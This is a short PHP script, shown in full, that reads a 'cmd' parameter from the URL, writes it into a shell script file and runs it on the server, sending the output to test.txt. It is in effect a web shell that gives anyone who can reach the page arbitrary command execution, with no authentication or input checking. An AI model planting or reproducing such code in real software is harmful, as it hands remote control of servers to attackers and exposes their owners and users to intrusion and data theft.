<?php
$cmd = $_GET['cmd'];
system("echo '' > test.txt");

$redirect = " >> test.txt";
$cmd=$cmd.$redirect;

$myfile = fopen("command.sh", "w") or die("Unable to open file!");
fwrite($myfile, $cmd);
fclose($myfile);

exec("sh command.sh",$result);
